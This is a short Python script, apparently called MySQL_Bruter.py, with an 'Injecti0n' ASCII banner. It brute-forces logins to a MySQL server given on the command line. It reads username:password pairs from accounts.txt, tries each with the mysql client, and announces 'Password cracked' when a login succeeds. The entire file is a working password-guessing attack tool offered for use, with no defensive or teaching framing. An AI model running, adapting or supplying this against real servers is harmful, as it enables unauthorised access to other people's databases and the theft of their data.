#!/usr/bin/python

import sys
import subprocess
import re

print ('''
 /$$$$$$                                     /$$     /$$  /$$$$$$           
|_  $$_/                                    | $$    |__/ /$$$_  $$          
  | $$   /$$$$$$$  /$$  /$$$$$$   /$$$$$$$ /$$$$$$   /$$| $$$$\ $$ /$$$$$$$ 
  | $$  | $$__  $$|__/ /$$__  $$ /$$_____/|_  $$_/  | $$| $$ $$ $$| $$__  $$
  | $$  | $$  \ $$ /$$| $$$$$$$$| $$        | $$    | $$| $$\ $$$$| $$  \ $$
  | $$  | $$  | $$| $$| $$_____/| $$        | $$ /$$| $$| $$ \ $$$| $$  | $$
 /$$$$$$| $$  | $$| $$|  $$$$$$$|  $$$$$$$  |  $$$$/| $$|  $$$$$$/| $$  | $$
|______/|__/  |__/| $$ \_______/ \_______/   \___/  |__/ \______/ |__/  |__/
             /$$  | $$                                                      
            |  $$$$$$/                                                      
             \______/                                                       
        ''')
print ("[+] Usage: python MySQL_Bruter.py IP/Or/H0stname")
print ("\n")
fo = open("accounts.txt", 'r');
for accounts in fo:
        password = accounts.split('\n')
        accs = password[0].split(':')
        if(len(sys.argv) == 2):
                execute = "mysql -h {0} -u {1} -p{2} -e STATUS".format(sys.argv[1], accs[0], accs[1])
                brute = subprocess.Popen(execute.split(), stdout=subprocess.PIPE)
                if(re.search("Uptime", brute.communicate()[0])):
                        print( "Yeyyy!!! Password cracked... Username:Password is ", accs[0],":",accs[1])
                        exit()
        else:
                print ("[+] Usage: \n\t[+] Mr@Robot# chmod u+x MySQL_Brute.py\n\t[+] Mr@Robot# ./MySQL_Brute.py ipaddress")
                exit()